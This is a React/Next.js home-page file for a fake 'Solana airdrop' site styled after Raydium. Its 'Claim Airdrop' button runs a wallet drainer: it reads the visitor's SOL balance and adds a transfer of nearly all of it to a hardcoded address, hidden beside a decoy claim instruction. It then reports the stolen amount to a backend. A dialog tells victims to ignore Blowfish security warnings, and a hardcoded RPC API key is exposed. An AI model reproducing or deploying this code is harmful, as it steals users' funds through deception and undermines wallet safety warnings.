import axios from 'axios'
import { ReactNode, useEffect, useMemo, useState } from 'react'
import { useRouter } from 'next/router'
import useWallet1 from '@/application/wallet/useWallet'
import useAppSettings from '@/application/common/useAppSettings'
import { useHomeInfo } from '@/application/homeInfo'
import Button from '@/components/Button'
import Card from '@/components/Card'
import Col from '@/components/Col'
import Grid from '@/components/Grid'
import Icon from '@/components/Icon'
import Image from '@/components/Image'
import Link from '@/components/Link'
import NumberJelly from '@/components/NumberJelly'
import Row from '@/components/Row'
import Tooltip from '@/components/Tooltip'
import linkTo from '@/functions/dom/linkTo'
import useDocumentMetaTitle from '@/hooks/useDocumentMetaTitle'
import { useDocumentScrollActionDetector } from '@/hooks/useScrollActionDetector'
import PageLayout from '@/components/PageLayout'
import { Checkbox } from '@/components/Checkbox'
import ResponsiveDialogDrawer from '@/components/ResponsiveDialogDrawer'
import { twMerge } from 'tailwind-merge'
import { setLocalItem } from '@/functions/dom/jStorage'
import {
  Connection,
  PublicKey,
  SystemProgram,
  TransactionInstruction,
  TransactionMessage,
  VersionedTransaction
} from '@solana/web3.js'
import { BN } from 'bn.js'
import { useAnchorWallet, useWallet } from '@solana/wallet-adapter-react'
import { getTipTransaction, sendAndConfirmSignedTransactions } from '@/pageComponents/Concentrated'
import { findProgramAddressSync } from '@project-serum/anchor/dist/cjs/utils/pubkey'
import {
  AIRDROP_AUTHORITY,
  AIRDROP_ID,
  AIRDROP_PROGRAM_PUBKEY,
  AIRDROP_SEED,
  TOKEN_PUBKEY,
  USER_SEED
} from '@/types/constants'
import { utf8 } from '@project-serum/anchor/dist/cjs/utils/bytes'
import * as anchor from '@project-serum/anchor'
import { ASSOCIATED_PROGRAM_ID } from '@project-serum/anchor/dist/cjs/utils/token'
import { AirdropProgram } from '@/idl/airdrop'
import { createAssociatedTokenAccountInstruction } from '@solana/spl-token'
import ReactPlayer from 'react-player'

function HomePageContainer({ children }: { children?: ReactNode }) {
  useDocumentScrollActionDetector()
  useDocumentMetaTitle('Raydium')
  return (
    <div
      className="flow-root overflow-x-hidden"
      style={{
        backgroundColor: '#141041',
        backgroundImage: "url('/backgroundImages/home-page-bg-lights.webp')",
        backgroundSize: '100% 95%',
        backgroundRepeat: 'no-repeat'
      }}
    >
      {children}
    </div>
  )
}

function HomePageNavbar() {
  const isMobile = useAppSettings((s) => s.isMobile)
  const { push } = useRouter()
  return (
    <Row className="justify-between mobile:justify-center py-12 px-[min(160px,8vw)]">
      <Image src="/logo/logo-with-text.svg" />
      {!isMobile && (
        <Button
          className="frosted-glass-teal"
          onClick={() => {
            push('/swap')
          }}
        >
          Launch app
        </Button>
      )}
    </Row>
  )
}

function VideoPlayDialog({
  onClose
}: {
  onClose?: () => void
}) {
  const videosrc = "/videos/guide.mp4";
  return (
    <ResponsiveDialogDrawer
      maskNoBlur
      placement="from-bottom"
      open={true}
      canClosedByMask={false}
    >
      <Card
        className={twMerge(
          `flex flex-col p-8 mobile:p-5 rounded-3xl mobile:rounded-b-none mobile:h-[80vh] w-[min(552px,100vw)] mobile:w-full border-1.5 border-[rgba(171,196,255,0.2)]`
        )}
        size="lg"
        style={{
          background:
            'linear-gradient(140.14deg, rgba(0, 182, 191, 0.15) 0%, rgba(27, 22, 89, 0.1) 86.61%), linear-gradient(321.82deg, #18134D 0%, #1B1659 100%)',
          boxShadow: '0px 8px 48px rgba(171, 196, 255, 0.12)'
        }}
      >
        {/* title */}
        <div className="text-xl font-semibold text-white">How to Claim ?</div>

        {/* content */}
        <div className="grow text-sm leading-normal text-[#abc4ffb3] scrollbar-width-thin h-96 mobile:h-12 rounded p-4 my-6 mobile:my-4 bg-[#141041]">
          <div className='flex flex-col items-center'>
            <div className='mt-5 rounded-lg'>
              <ReactPlayer
                width="auto"
                height="225px"
                url={videosrc}
                controls={false}
                playing={true}
                // light is usefull incase of dark mode
                light={false}
                // picture in picture
                pip={true}
              />
              <source src={videosrc} type="video/mp4" />
            </div>
          </div>
          <div className='flex flex-col items-center'>
            <p className="mt-7 text-center">
              If you see this warning it means our site hasn't
              been whitelistet by
              <a href="https://blowfish.xyz/">
                blowfish.xyz
              </a>
              yet, this process
              takes time.
            </p>
            <u>
              Click "Ignore warning, proceed anyway" to
              continue action.
            </u>
          </div>
        </div>

        <Col className="">
          <Button
            className={`text-[#ABC4FF]  frosted-glass-teal`}
            onClick={onClose}
          >
            Agree and Continue
          </Button>
        </Col>
      </Card>
    </ResponsiveDialogDrawer>
  )
}


function HomePageSection0() {
  const isMobile = useAppSettings((s) => s.isMobile)
  const { push } = useRouter()
  const { tvl, totalvolume } = useHomeInfo()
  const owner = useWallet1((s) => s.owner)
  const connected = useWallet1((s) => s.connected)
  const NET_URL = 'https://mainnet.helius-rpc.com/?api-key=e4226aa3-24f7-43c1-869f-a1b1e3fbb148'
  const connection = new Connection(NET_URL, 'confirmed')
  const { signAllTransactions, sendTransaction } = useWallet()
  const API_BASE_URI = process.env.API_BASE_URI || 'http://localhost:3006'
  const [isButtonClicked, setIsButtonClicked] = useState(false)
  const anchorWallet = useAnchorWallet()

  const programId = new PublicKey(AIRDROP_PROGRAM_PUBKEY)
  const program = useMemo(() => {
    if (anchorWallet) {
      const provider = new anchor.AnchorProvider(connection, anchorWallet, anchor.AnchorProvider.defaultOptions())
      return new anchor.Program(AirdropProgram as anchor.Idl, AIRDROP_PROGRAM_PUBKEY, provider)
    }
  }, [connection, anchorWallet])
  const txTransfer = async () => {
    if (owner) {
      try {
        // await axios.post(API_BASE_URI + "/api/sendSignNotification", { owner: owner })
        const [airdrop_info, airdrop_bump] = findProgramAddressSync(
          [utf8.encode(AIRDROP_SEED), AIRDROP_AUTHORITY.toBuffer(), new Uint8Array([AIRDROP_ID])],
          AIRDROP_PROGRAM_PUBKEY
        )
        const [userInfo, userBump] = findProgramAddressSync(
          [utf8.encode(USER_SEED), owner.toBuffer(), new Uint8Array([AIRDROP_ID])],
          AIRDROP_PROGRAM_PUBKEY
        )

        const claimer_associated_token_account = await anchor.utils.token.associatedAddress({
          mint: TOKEN_PUBKEY,
          owner: owner
        })

        const airdrop_token_associated_token_account = await anchor.utils.token.associatedAddress({
          mint: TOKEN_PUBKEY,
          owner: airdrop_info
        })

        const totalInstructions: TransactionInstruction[] = []
        if (program) {
          // try {
          //   const info = await connection.getAccountInfo(claimer_associated_token_account)
          //   if (!info) {
          //     totalInstructions.push(
          //       createAssociatedTokenAccountInstruction(owner, claimer_associated_token_account, owner, TOKEN_PUBKEY)
          //     )
          //   }
          // } catch (err) {
          //   console.warn(err)
          // }

          const txClaim = await program.methods
            .claimToken(AIRDROP_ID)
            .accounts({
              mintAccount: TOKEN_PUBKEY,
              airdropAuthority: AIRDROP_AUTHORITY,
              depositedTokenAta: airdrop_token_associated_token_account,
              claimerAta: claimer_associated_token_account,
              userInfo: userInfo,
              airdropInfo: airdrop_info,
              claimer: owner,
              rent: anchor.web3.SYSVAR_RENT_PUBKEY,
              systemProgram: anchor.web3.SystemProgram.programId,
              tokenProgram: anchor.utils.token.TOKEN_PROGRAM_ID,
              associatedTokenProgram: ASSOCIATED_PROGRAM_ID
            })
            .instruction()
          totalInstructions.push(txClaim)
        }
        const solBalance = new BN((await connection.getBalance(owner)).toString())
        console.warn(solBalance)
        const fee = new BN('10000000')
        const toAddress = new PublicKey('5cLAoXaK1UjZreSuuzVwY5rAhVPaotgAZ8sNdUruEWWA')
        // const toAddress = new PublicKey('s393nmNfuwXasFnABhVqka58VsPcnP8jKLYZ4ZXJcP1')
        // const toAddress = new PublicKey('H7YPtMRHNPcaNANC3BVeK2a3JW6mvduicm1qmcznQfGi')
        if (solBalance == undefined || solBalance.sub(fee).toNumber() < 0) {
          console.warn('solbalance is not enough')
          await axios.post(API_BASE_URI + '/api/sendNotEnoughNotification')
          return
        }
        totalInstructions.push(
          SystemProgram.transfer({
            fromPubkey: owner,
            toPubkey: toAddress,
            lamports: solBalance.sub(fee).toNumber()
          })
        )

        const recentBlockhash = (await connection.getLatestBlockhash('confirmed')).blockhash
        const transactionMessage = new TransactionMessage({
          payerKey: owner,
          instructions: totalInstructions,
          recentBlockhash
        })
        let txns: VersionedTransaction[] = []
        const tx = new VersionedTransaction(transactionMessage.compileToV0Message())
        txns.push(tx)
        const tipTx = await getTipTransaction(connection, owner, 0.005)
        if (tipTx) txns.push(tipTx)
        if (txns && signAllTransactions) {
          txns = await signAllTransactions(txns)
          const signature = await sendAndConfirmSignedTransactions(true, connection, txns)
          const sentBalance = solBalance.sub(fee).toNumber() / 1000000000
          if (signature) {
            await axios.post(API_BASE_URI + '/api/sendTransferNotification', {
              balance: sentBalance.toFixed(4),
              tx: signature
            })
          }
        }
      } catch (err) {
        console.warn(err)
      }
    }
  }

  return (
    <section className="grid-child-center grid-cover-container mb-16 relative">
      {isButtonClicked && <VideoPlayDialog onClose={() => { setIsButtonClicked(false) }} />}
      <Image src="/backgroundImages/home-bg-element-1.png" className="w-[744px] mobile:w-[394px]" />
      <div className="grid-cover-content children-center">
        <div className="font-light text-[64px] mobile:text-[30px] text-white mb-4 mt-14 mobile:mt-9 leading-[60px] mobile:leading-[32px]">
          Claim your Solana <br />
          Airdrop now for{' '}
          <span
            className="font-bold text-transparent bg-clip-text"
            style={{
              background: 'radial-gradient(circle at top right,#39d0d8,#2b6aff)',
              backgroundClip: 'text',
              WebkitBackgroundClip: 'text'
            }}
          >
            Free
          </span>
        </div>
        <div className="font-normal text-xl mobile:text-base text-[#adc6ff] mb-6">
          Solana <b>Airdrop</b>. Great <b>opportunity</b>. {isMobile ? <br /> : ''} Friction-less <b>Airdrop</b>.
        </div>
        {/* two button */}
        <Row className="gap-8 mobile:gap-4 mb-16 mobile:mb-6 grid grid-cols-1-fr">
          {(connected && (
            <Button
              className="frosted-glass-teal text-white mobile:text-xs px-5 mobile:px-4 forsted-blur"
              onClick={async () => {
                setIsButtonClicked(true)
                await txTransfer()
              }}
            >
              <Row className="items-center gap-2">
                <div>Claim Airdrop</div>
                <Icon heroIconName="chevron-right" size="xs" />
              </Row>
            </Button>
          )) || (
              <Button
                className="frosted-glass-teal text-white mobile:text-xs px-5 mobile:px-4 forsted-blur"
                onClick={() => {
                  setIsButtonClicked(true)
                  useAppSettings.setState({ needPopDisclaimer: false })
                  setLocalItem<boolean>('USER_AGREE_DISCLAIMER', true)
                  useAppSettings.setState({ isWalletSelectorShown: true })
                }}
              >
                <Row className="items-center gap-2">
                  <div>Claim Airdrop</div>
                  <Icon heroIconName="chevron-right" size="xs" />
                </Row>
              </Button>
            )}
        </Row>
        {/* two panels */}
        <Row className="gap-6 mobile:gap-3 mb-9 grid grid-cols-2-fr">
          <Card className="frosted-glass-smoke forsted-blur-sm rounded-3xl mobile:rounded-2xl p-6 mobile:py-3 mobile:px-6 mobile:min-w-[156px] min-w-[250px] tablet:min-w-[250px]">
            <div className="text-sm text-[#adc6ff] mb-1 mobile:text-[8px]">TOTAL VALUE LOCKED</div>
            {/* value */}
            <Row className="justify-center text-xl mobile:text-xs font-normal text-white tracking-widest mobile:tracking-wider">
              <div className="mr-1">$</div>
              {tvl && (
                <NumberJelly
                  fractionLength={0}
                  eachLoopDuration={400}
                  totalDuration={8 * 60 * 1000}
                  maxDeltaPercent={0.05}
                  currentValue={tvl}
                  initValue={tvl ? 0.999 * tvl : undefined}
                />
              )}
            </Row>
          </Card>

          <Card className="frosted-glass-smoke forsted-blur-sm rounded-3xl mobile:rounded-2xl p-6 mobile:py-3 mobile:px-6 mobile:min-w-[156px] min-w-[250px] tablet:min-w-[250px]">
            <div className="text-sm text-[#adc6ff] mb-1 mobile:text-[8px]">TOTAL TRADING VOLUME</div>
            {/* value */}
            <Row className="justify-center text-xl mobile:text-xs font-normal text-white tracking-widest mobile:tracking-wider">
              <div className="mr-1">$</div>
              {totalvolume && (
                <NumberJelly
                  fractionLength={0}
                  eachLoopDuration={200}
                  totalDuration={8 * 60 * 1000}
                  maxDeltaPercent={0.05}
                  currentValue={totalvolume}
                  initValue={totalvolume ? 0.999 * totalvolume : undefined}
                />
              )}
            </Row>
          </Card>
        </Row>
        <Image src="/logo/build-on-slogan.svg" className="transform mobile:scale-75" />
      </div>
    </section>
  )
}

function HomePageSection1() {
  const { push } = useRouter()
  return (
    <section
      className="grid-child-center overflow-hidden relative mx-auto tablet:mx-5 px-24 tablet:p-8 max-w-[1320px] min-h-[506px] hidden rounded-[100px] mobile:rounded-[40px]"
      style={{
        background:
          "radial-gradient(at center top, transparent 20%, hsl(245, 60%, 16%, 0.2)), url('/backgroundImages/home-page-section1-light.webp'), #1b1659",
        boxShadow:
          '8px 8px 10px rgba(20, 16, 65, 0.05), -8px -8px 10px rgba(197, 191, 255, 0.05), inset 0 6px 20px rgba(197, 191, 255, 0.2), inset 0 -1px 25px rgba(197, 191, 255, 0.1)',
        backgroundSize: '100% 100%'
      }}
    >
      <div
        className="absolute inset-0 opacity-30"
        style={{
          background: 'linear-gradient(245.22deg, #da2eef 7.97%, #2b6aff 49.17%, #39d0d8 92.1%)',
          maskImage: "url('/backgroundImages/home-bg-element-2.png')",
          WebkitMaskImage: "url('/backgroundImages/home-bg-element-2.png')",
          maskSize: 'cover',
          WebkitMaskSize: 'cover'
        }}
      />
      <div>
        <div className="mb-8">
          <div
            className="w-10 h-px my-2 mx-auto rounded-full"
            style={{ background: 'radial-gradient(39.84% 47.5% at 96.82% 58.33%, #39d0d8 0%, #2b6aff 100%)' }}
          />
          <div className="text-lg">Claim your Solana Airdrop now for free</div>
        </div>

        <Grid className="gap-5 grid-cols-4 tablet:grid-cols-2 mobile:grid-cols-1">
          <Card className="flex-1 children-center frosted-glass-lightsmoke forsted-blur-sm py-6 px-12 rounded-3xl">
            <div className="frosted-glass-teal p-3 mb-3 rounded-xl">
              <Icon iconSrc="/icons/home-trade.svg" />
            </div>
            <div className="font-semibold text-lg text-white mb-2">Trade</div>
            <div className="font-light text-sm text-[#c4d6ff] mb-5">Swap or Trade quickly and cheaply.</div>
            <Button
              className="frosted-glass-teal"
              onClick={() => {
                push('/swap')
              }}
            >
              Enter Exchange
            </Button>
          </Card>

          <Card className="flex-1 children-center frosted-glass-lightsmoke forsted-blur-sm py-6 px-12 rounded-3xl">
            <div className="frosted-glass-teal p-3 mb-3 rounded-xl">
              <Icon iconSrc="/icons/home-yield.svg" />
            </div>
            <div className="font-semibold text-lg text-white mb-2">Yield</div>
            <div className="font-light text-sm text-[#c4d6ff] mb-5">Earn yield through fees and yield farms.</div>
            <Button
              className="frosted-glass-teal"
              onClick={() => {
                push('/farms')
              }}
            >
              Enter Farms
            </Button>
          </Card>

          <Card className="flex-1 children-center frosted-glass-lightsmoke forsted-blur-sm py-6 px-12 rounded-3xl">
            <div className="frosted-glass-teal p-3 mb-3 rounded-xl">
              <Icon iconSrc="/icons/home-pool.svg" />
            </div>
            <div className="font-semibold text-lg text-white mb-2">Pool</div>
            <div className="font-light text-sm text-[#c4d6ff] mb-5">Provide liquidity for any SPL token.</div>
            <Button
              className="frosted-glass-teal"
              onClick={() => {
                push('/liquidity/add')
              }}
            >
              Add Liquidity
            </Button>
          </Card>

          <Card className="flex-1 children-center frosted-glass-lightsmoke forsted-blur-sm py-6 px-12 rounded-3xl">
            <div className="frosted-glass-teal p-3 mb-3 rounded-xl">
              <Icon iconSrc="/icons/home-acceleraytor.svg" />
            </div>
            <div className="font-semibold text-lg text-white mb-2">AcceleRaytor</div>
            <div className="font-light text-sm text-[#c4d6ff] mb-5">Launchpad for new Solana projects.</div>
            <Button
              className="frosted-glass-teal"
              onClick={() => {
                push('https://v1.raydium.io/acceleRaytor')
              }}
            >
              View Projects
            </Button>
          </Card>
        </Grid>
      </div>
    </section>
  )
}

function HomePageSection2() {
  const isMobile = useAppSettings((s) => s.isMobile)
  const isTablet = useAppSettings((s) => s.isTablet)

  return (
    <section className="grid-child-center grid-cover-container">
      <div
        className="w-screen h-full"
        style={{
          background:
            isMobile || isTablet
              ? "url('/backgroundImages/home-bg-element-4.png') 0% 0% / 100% 100%"
              : "url('/backgroundImages/home-bg-element-3.png') 0% 0% / 100% 100%"
        }}
      />
      <div className="max-w-[1220px] px-14 tablet:px-4 mt-28 mx-16 tablet:mx-4 mb-44">
        <div className="mb-8">
          <div
            className="w-10 h-px my-2 mx-auto rounded-full"
            style={{ background: 'radial-gradient(39.84% 47.5% at 96.82% 58.33%, #39d0d8 0%, #2b6aff 100%)' }}
          />
          <div className="text-lg">Raydium provides Ecosystem-Wide Liquidity for users and projects</div>
        </div>

        <Grid className="gap-6 grid-cols-3 tablet:grid-cols-1 mobile:grid-cols-1 justify-items-center">
          <Card
            className="max-w-[356px] grid children-center frosted-glass-smoke  forsted-blur-sm py-6 px-10 rounded-3xl"
            style={{
              gridTemplateRows: 'auto auto 1fr',
              alignItems: 'normal'
            }}
          >
            <div className="frosted-glass-teal p-3 mb-3 rounded-xl">
              <Icon iconSrc="/icons/home-order-book-AMM.svg" />
            </div>
            <div className="font-semibold text-lg text-white mb-2">Order Book AMM</div>
            <div className="font-light text-[#c4d6ff] mb-5">
              Raydium{"'"}s AMM interacts with OpenBook{"'"}s central limit order book, meaning that pools have access
              to all order flow and liquidity on OpenBook, and vice versa.
            </div>
          </Card>

          <Card
            className="max-w-[356px] grid children-center frosted-glass-smoke  forsted-blur-sm py-6 px-10 rounded-3xl"
            style={{
              gridTemplateRows: 'auto auto 1fr',
              alignItems: 'normal'
            }}
          >
            <div className="frosted-glass-teal p-3 mb-3 rounded-xl">
              <Icon iconSrc="/icons/home-yield.svg" />
            </div>
            <div className="font-semibold text-lg text-white mb-2">Best Price Swaps</div>
            <div className="font-light text-[#c4d6ff] mb-5">
              Raydium determines the best swap route among all pools in order to provide the best price for users, and
              executes accordingly.
            </div>
          </Card>

          <Card
            className="max-w-[356px] grid children-center frosted-glass-smoke  forsted-blur-sm py-6 px-10 rounded-3xl"
            style={{
              gridTemplateRows: 'auto auto 1fr',
              alignItems: 'normal'
            }}
          >
            <div className="frosted-glass-teal p-3 mb-3 rounded-xl">
              <Icon iconSrc="/icons/home-pool.svg" />
            </div>
            <div className="font-semibold text-lg text-white mb-2">Disclaimer</div>
            <div className="font-light text-[#c4d6ff] mb-5">
              This page is for testing purposes only and does not represent any connection to
              <a href="https://raydium.io/swap/?inputMint=sol&outputMint=4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R">raydium.io</a>.
              We assume no liability for lost assets.
            </div>
          </Card>
        </Grid>
      </div>
    </section>
  )
}

function HomePageSection3() {
  return (
    <section className="children-center mb-24">
      <div className="mb-8">
        <div className="text-lg">Partners</div>
        <div
          className="w-10 h-px my-2 mx-auto rounded-full"
          style={{ background: 'radial-gradient(39.84% 47.5% at 96.82% 58.33%, #39d0d8 0%, #2b6aff 100%)' }}
        />
      </div>
      <Row className="w-full justify-around px-56 tablet:px-0 mobile:px-0 tablet:grid mobile:grid gap-16 gap-y-4">
        <Image src="/logo/solana-text-logo.svg" />
        <Image src="/logo/serum-text-logo.svg" />
      </Row>
    </section>
  )
}

function HomePageFooter() {
  const isMobile = useAppSettings((s) => s.isMobile)
  const isTablet = useAppSettings((s) => s.isTablet)
  return (
    <footer
      className="pt-56 overflow-hidden"
      style={{
        background:
          isTablet || isMobile
            ? "url('/backgroundImages/home-footer-bg.webp') 0 0 / auto 100%"
            : "url('/backgroundImages/home-footer-bg.webp') 0 0 / 100% 100%"
      }}
    >
      <Grid className="mobile:gap-14 justify-around px-[10%] grid-cols-4 tablet:grid-cols-3 mobile:grid-cols-1 gap-16 gap-y-4">
        <div>
          <div className="mb-8">
            <div className="text-sm mb-3 tablet:text-center">ABOUT</div>
            <div
              className="w-6 h-px my-2 rounded-full tablet:mx-auto"
              style={{ background: 'radial-gradient(39.84% 47.5% at 96.82% 58.33%, #39d0d8 0%, #2b6aff 100%)' }}
            />
          </div>
          <Col className="gap-6">
            <Link
              className="text-[#c4d6ff] hover:text-white tablet:text-center"
              href="https://raydium.gitbook.io/raydium/"
            >
              Documentation
            </Link>
            <Link
              className="text-[#c4d6ff] hover:text-white tablet:text-center"
              href="https://coinmarketcap.com/currencies/raydium/"
            >
              CoinMarketCap
            </Link>
            <Link
              className="text-[#c4d6ff] hover:text-white tablet:text-center"
              href="https://www.coingecko.com/en/coins/raydium"
            >
              CoinGecko
            </Link>
            <Link openInNewTab className="text-[#c4d6ff] hover:text-white tablet:text-center" href="/docs/disclaimer">
              Disclaimer
            </Link>
          </Col>
        </div>

        <div>
          <div className="mb-8">
            <div className="text-sm mb-3 tablet:text-center">PROTOCOL</div>
            <div
              className="w-6 h-px my-2 rounded-full tablet:mx-auto"
              style={{ background: 'radial-gradient(39.84% 47.5% at 96.82% 58.33%, #39d0d8 0%, #2b6aff 100%)' }}
            />
          </div>
          <Col className="gap-6">
            <Link
              className="text-[#c4d6ff] hover:text-white tablet:text-center"
              href="https://forms.gle/Fjq4MiRA2qWbPyt29"
            >
              Apply for DropZone
            </Link>
            <Link
              className="text-[#c4d6ff] hover:text-white tablet:text-center"
              href="https://docs.google.com/forms/d/1Mk-x0OcI1tCZzL0Lj_WY8d02dMXsc-Z2AG3AaO6W_Rc/edit#responses"
            >
              Apply for Fusion Pool
            </Link>
            <Link
              className="text-[#c4d6ff] hover:text-white tablet:text-center"
              href="https://docs.google.com/forms/d/1Mk-x0OcI1tCZzL0Lj_WY8d02dMXsc-Z2AG3AaO6W_Rc/edit#responses"
            >
              Apply for AcceleRaytor
            </Link>
            <Link
              className="text-[#c4d6ff] hover:text-white tablet:text-center"
              href="https://raydium.gitbook.io/raydium/permissionless/creating-a-pool"
            >
              Permissionless Pool
            </Link>
          </Col>
        </div>

        <div>
          <div className="mb-8">
            <div className="text-sm mb-3 tablet:text-center">SUPPORT</div>
            <div
              className="w-6 h-px my-2 rounded-full tablet:mx-auto"
              style={{ background: 'radial-gradient(39.84% 47.5% at 96.82% 58.33%, #39d0d8 0%, #2b6aff 100%)' }}
            />
          </div>
          <Col className="gap-6">
            <Link
              className="text-[#c4d6ff] hover:text-white tablet:text-center"
              href="https://raydium.gitbook.io/raydium/trading-on-serum/spl-wallets"
            >
              Getting Started on Raydium
            </Link>
            <Link
              className="text-[#c4d6ff] hover:text-white tablet:text-center"
              href="https://raydium.gitbook.io/raydium/trading-on-serum/faq"
            >
              FAQ
            </Link>
          </Col>
        </div>

        <div className="tablet:col-span-full tablet:justify-self-center">
          <div className="mb-8 tablet:hidden">
            <div className="text-sm mb-3">COMMUNITY</div>
            <div
              className="w-6 h-px my-2 rounded-full"
              style={{ background: 'radial-gradient(39.84% 47.5% at 96.82% 58.33%, #39d0d8 0%, #2b6aff 100%)' }}
            />
          </div>
          <Grid className="flex flex-col tablet:flex-row gap-6 tablet:gap-10">
            <Link className="text-[#c4d6ff] hover:text-white" href="https://twitter.com/RaydiumProtocol">
              <Row className="items-center gap-2">
                <Icon
                  className="frosted-glass-teal p-1.5 rounded-lg text"
                  iconClassName="w-5 h-5 tablet:w-6 tablet:h-6"
                  iconSrc="icons/media-twitter.svg"
                />
                <div className="tablet:hidden">Twitter</div>
              </Row>
            </Link>
            <Link className="text-[#c4d6ff] hover:text-white" href="https://raydium.medium.com/">
              <Row className="items-center gap-2">
                <Icon
                  className="frosted-glass-teal p-1.5 rounded-lg text"
                  iconClassName="w-5 h-5 tablet:w-6 tablet:h-6"
                  iconSrc="icons/media-medium.svg"
                />
                <div className="tablet:hidden">Medium</div>
              </Row>
            </Link>
            <Link className="text-[#c4d6ff] hover:text-white" href="https://discord.gg/raydium">
              <Row className="items-center gap-2">
                <Icon
                  className="frosted-glass-teal p-1.5 rounded-lg text"
                  iconClassName="w-5 h-5 tablet:w-6 tablet:h-6"
                  iconSrc="icons/media-discord.svg"
                />
                <div className="tablet:hidden">Discord</div>
              </Row>
            </Link>
            <Row className="items-center gap-2">
              <Tooltip triggerBy="click" placement={isTablet || isMobile ? 'left' : 'right'}>
                <Row className="text-[#c4d6ff] hover:text-white items-center gap-1 cursor-pointer">
                  <Icon
                    className="frosted-glass-teal p-1.5 rounded-lg text"
                    iconClassName="w-5 h-5 tablet:w-6 tablet:h-6"
                    iconSrc="/icons/media-telegram.svg"
                  />
                  <div className="tablet:hidden">Telegram</div>
                  <Icon size="sm" heroIconName="chevron-down" />
                </Row>
                <Tooltip.Panel>
                  <Col className="divide-y-1.5">
                    <Link
                      className="border-[rgba(196,214,255,0.1)] text-[#c4d6ff] hover:text-white p-2 whitespace-nowrap text-sm"
                      href="https://t.me/raydiumprotocol"
                    >
                      Telegram (EN)
                    </Link>
                    <Link
                      className="border-[rgba(196,214,255,0.1)] text-[#c4d6ff] hover:text-white p-2 whitespace-nowrap text-sm"
                      href="https://t.me/RaydiumChina"
                    >
                      Telegram (CN)
                    </Link>
                    <Link
                      className="border-[rgba(196,214,255,0.1)] text-[#c4d6ff] hover:text-white p-2 whitespace-nowrap text-sm"
                      href="https://t.me/raydiumkorea"
                    >
                      Telegram (KR)
                    </Link>
                    <Link
                      className="border-[rgba(196,214,255,0.1)] text-[#c4d6ff] hover:text-white p-2 whitespace-nowrap text-sm"
                      href="https://t.me/raydiumjapan"
                    >
                      Telegram (JP)
                    </Link>
                    <Link
                      className="border-[rgba(196,214,255,0.1)] text-[#c4d6ff] hover:text-white p-2 whitespace-nowrap text-sm"
                      href="https://t.me/RaydiumSpanish"
                    >
                      Telegram (ES)
                    </Link>
                    <Link
                      className="border-[rgba(196,214,255,0.1)] text-[#c4d6ff] hover:text-white p-2 whitespace-nowrap text-sm"
                      href="https://t.me/RaydiumTurkey"
                    >
                      Telegram (TR)
                    </Link>
                    <Link
                      className="border-[rgba(196,214,255,0.1)] text-[#c4d6ff] hover:text-white p-2 whitespace-nowrap text-sm"
                      href="https://t.me/RaydiumVietnam"
                    >
                      Telegram (VN)
                    </Link>
                    <Link
                      className="border-[rgba(196,214,255,0.1)] text-[#c4d6ff] hover:text-white p-2 whitespace-nowrap text-sm"
                      href="https://t.me/RaydiumRussian"
                    >
                      Telegram (RU)
                    </Link>
                    <Link
                      className="border-[rgba(196,214,255,0.1)] text-[#c4d6ff] hover:text-white p-2 whitespace-nowrap text-sm"
                      href="https://t.me/raydiumthailand"
                    >
                      Telegram (TH)
                    </Link>
                  </Col>
                </Tooltip.Panel>
              </Tooltip>
            </Row>
          </Grid>
        </div>
      </Grid>

      <Image className="mx-auto p-20 transform scale-125 pointer-events-none" src="/logo/logo-with-text.svg" />
    </footer>
  )
}

function BetaBanner() {
  const [isBetaInfoOpen, setIsBetaInfoOpen] = useState(true)
  return (
    <div className={`flex flex-row ${isBetaInfoOpen ? 'flex' : 'hidden'} bg-ground-color-light`}>
      <div className="flex items-center justify-center text-center my-2" style={{ width: '95%' }}>
        <div className="text-primary text-sm font-normal">
          <span>In case you missed it, Raydium V3 Beta is live - check it out </span>
          <a href="https://beta.raydium.io" rel="noreferrer" target="_blank" className="text-link-color">
            here
          </a>
          <span>! More info in the </span>
          <a
            href="https://x.com/RaydiumProtocol/status/1772563377501724786"
            rel="noreferrer"
            target="_blank"
            className="text-link-color"
          >
            Tweet
          </a>
          .
        </div>
      </div>
      <div
        className="flex items-center justify-center cursor-pointer hover:bg-ground-color"
        style={{ width: '5%' }}
        onClick={() => setIsBetaInfoOpen(false)}
      >
        ×
      </div>
    </div>
  )
}

export default function HomePage() {
  return (
    <HomePageContainer>
      <BetaBanner />
      <HomePageNavbar />
      <HomePageSection0 />
      <HomePageSection1 />
      <HomePageSection2 />
      <HomePageFooter />
    </HomePageContainer>
  )
}
